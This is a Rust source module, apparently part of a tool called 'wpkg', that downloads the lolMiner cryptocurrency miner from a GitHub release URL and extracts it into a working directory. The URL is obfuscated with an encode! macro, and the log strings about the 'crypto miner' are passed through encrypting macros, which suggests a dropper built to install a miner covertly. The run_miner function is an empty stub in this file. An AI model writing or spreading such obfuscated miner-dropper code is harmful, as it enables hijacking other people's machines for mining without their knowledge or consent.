use std::fs;
use std::io::Cursor;
use std::path::Path;

use tracing::*;
use wpkg_macro::*;

use crate::{crypto, info_crypt, utils};

pub const MINER_DIR: &str = "lolminer";
pub const URL: &str = encode!("https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.59/lolMiner_v1.59a_Win64.zip");

pub async fn download_lolminer() -> anyhow::Result<()> {
    if !is_installed()? {
        let path = &format!("{}/{}", utils::get_working_dir()?, MINER_DIR);

        utils::download_from_url(
            &wpkg_crypto::decode(URL),
            &format!("{}/lolminer.zip", utils::get_working_dir()?),
        )
        .await?;

        info!("{}{}", crypto!("Unpacking crypto miner to "), &path);
        let zipdata = fs::read(format!("{}/lolminer.zip", &utils::get_working_dir()?))?;

        info_crypt!("Extracting miner...");
        zip_extract::extract(Cursor::new(zipdata), &Path::new(path), true)?;
    } else {
        info_crypt!("Miner is installed")
    }

    Ok(())
}

pub fn is_installed() -> anyhow::Result<bool> {
    Ok(Path::new(&format!("{}/{}", utils::get_working_dir()?, MINER_DIR)).exists())
}

#[allow(dead_code)]
pub fn run_miner() {}
